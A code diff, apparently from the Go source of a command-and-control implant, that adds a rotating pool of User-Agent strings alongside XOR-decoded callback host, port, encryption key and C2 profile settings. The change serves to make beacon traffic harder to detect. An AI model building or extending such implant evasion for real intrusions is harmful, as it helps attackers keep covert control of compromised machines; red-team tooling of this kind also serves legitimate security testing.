@@ -39,6 +39,7 @@ var (
 	callbackHost      string = ""
 	callbackPort      string = "443"
 	userAgent         string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+	userAgentPool     string = "" // Newline-separated pool of User-Agent strings for rotation
 	sleepInterval     string = "10"
 	jitter            string = "10"
 	encryptionKey     string = ""
@@ -101,6 +102,7 @@ func runAgent() {
 			callbackHost = xorDecodeString(callbackHost, keyBytes)
 			callbackPort = xorDecodeString(callbackPort, keyBytes)
 			userAgent = xorDecodeString(userAgent, keyBytes)
+			userAgentPool = xorDecodeString(userAgentPool, keyBytes)
 			encryptionKey = xorDecodeString(encryptionKey, keyBytes)
 			getURI = xorDecodeString(getURI, keyBytes)
 			postURI = xorDecodeString(postURI, keyBytes)
@@ -453,6 +455,15 @@ func runAgent() {
 			fallbackURLs,
 			ctList,
 		)
+		// Parse User-Agent pool for per-request rotation
+		if userAgentPool != "" {
+			for _, ua := range strings.Split(userAgentPool, "\n") {
+				ua = strings.TrimSpace(ua)
+				if ua != "" {
+					httpProfile.UserAgentPool = append(httpProfile.UserAgentPool, ua)
+				}
+			}
+		}
 		// Decode and apply custom HTTP headers from C2 profile
 		if customHeaders != "" {
 			if decoded, err := base64.StdEncoding.DecodeString(customHeaders); err == nil {
@@ -997,6 +1008,7 @@ func clearGlobals() {
 	callbackHost = ""
 	callbackPort = ""
 	userAgent = ""
+	userAgentPool = ""
 	encryptionKey = ""
 	getURI = ""
 	postURI = ""
